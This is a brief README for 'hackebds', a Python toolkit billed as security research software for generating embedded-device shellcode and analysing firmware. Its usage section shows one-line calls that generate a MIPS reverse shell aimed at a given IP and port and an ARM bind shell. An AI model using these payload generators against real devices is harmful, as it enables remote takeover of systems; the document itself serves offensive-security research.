# hackebds

A security research toolkit for embedded device shellcode generation and vulnerability analysis.

## Features

- Multi-architecture shellcode generation (ARM, MIPS, PowerPC, SPARC, AArch64)
- Reverse shell and bind shell payloads
- Firmware analysis tools
- CVE vulnerability database
- Integration with pwntools

## Installation

```bash
pip install hackebds
```

## Usage

```python
import hackebds

# Generate MIPS reverse shell
shellcode = hackebds.mips_backdoor("192.168.1.1", 4444)

# Generate ARM bind shell
shellcode = hackebds.bindshell_arm(4444)
```

## Command Line

```bash
hackebds --help
```

## Requirements

- Python >= 3.8
- pwntools
- colorama

## License

MIT License
